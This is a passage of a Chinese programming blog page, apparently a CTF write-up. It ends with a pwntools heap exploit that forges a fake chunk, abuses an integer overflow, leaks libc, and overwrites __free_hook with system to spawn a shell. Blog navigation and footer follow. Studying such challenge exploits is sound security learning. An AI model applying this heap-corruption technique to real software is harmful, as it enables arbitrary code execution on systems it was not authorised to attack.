+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'current_role: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>current_role<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'role: &lt;0.teacher/1.student&gt;: '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	add_student<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+change_role<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+write_review<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token string">'deadbeef'</span><span class="token punctuation">)</span>
+write_review<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">'deadbeef'</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 1: construct a fake chunk to bypass the check for free() of student 6</span>
+write_review<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xF0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 2: give student 4 reward to change the chunk address of student 5 to that of student 6</span>
+change_role<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+change_sid<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+pray<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+change_role<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+give_score<span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># int overflow</span>
+
+change_role<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+change_sid<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+check_review<span class="token punctuation">(</span><span class="token number">0x39</span> <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span>
+chunk_addr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">0x200</span>
+
+<span class="token comment">### Step 3: give student 6 reward to change the chunk size of student 6 to 0x100 more</span>
+change_role<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+change_sid<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+pray<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+change_role<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+give_score<span class="token punctuation">(</span><span class="token punctuation">)</span>	<span class="token comment"># int overflow</span>
+
+change_role<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+change_sid<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+check_review<span class="token punctuation">(</span><span class="token number">0x48</span> <span class="token operator">+</span> <span class="token number">0x100</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 4: delete student 6 to free the chunk with fake size: 0x500</span>
+change_role<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+call_parent<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 5: read the comment of student 5 to get and calculate the libc address</span>
+change_role<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+change_sid<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice&gt;&gt; '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'here is the review:\n'</span><span class="token punctuation">)</span>
+main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span>
+libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
+sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>		<span class="token comment"># system address got</span>
+malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
+free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+
+<span class="token comment">### Step 6: get student 6 back, now the pointer of student 6 should be in the chunk of student 5</span>
+change_role<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+add_student<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 7: write comment for student 6: '/bin/sh'</span>
+write_review<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 8: change the address of student 6 to write system address to __free_hook</span>
+stu6_writeaddr <span class="token operator">=</span> chunk_addr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x50</span>	<span class="token comment"># address of student 6 to write to</span>
+
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>chunk_addr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span>	<span class="token comment"># address of student 6 header chunk</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>	<span class="token comment"># size of student 6 header chunk</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>	<span class="token comment"># change the write address of student 6 to __free_hook</span>
+write_review<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 9: write system address to __free_hook</span>
+write_review<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 10: change the address of student 6 back to buffer string '/bin/sh'</span>
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>chunk_addr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span>	<span class="token comment"># address of student 6 header chunk</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>	<span class="token comment"># size of student 6 header chunk</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stu6_writeaddr<span class="token punctuation">)</span>
+write_review<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+<span class="token comment">### Step 11: delete student 6, getshell</span>
+change_role<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+call_parent<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/b0333a6de869885d988ffd10f31490f9/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">深入探究ASP.NET Core读取Request.Body的正确方式</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/00d0d51d087d6dcb7ce39c5ae7816a63/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">OpenSSL SSL_read: Connection was reset, errno 10054的解决方法</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程大白的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
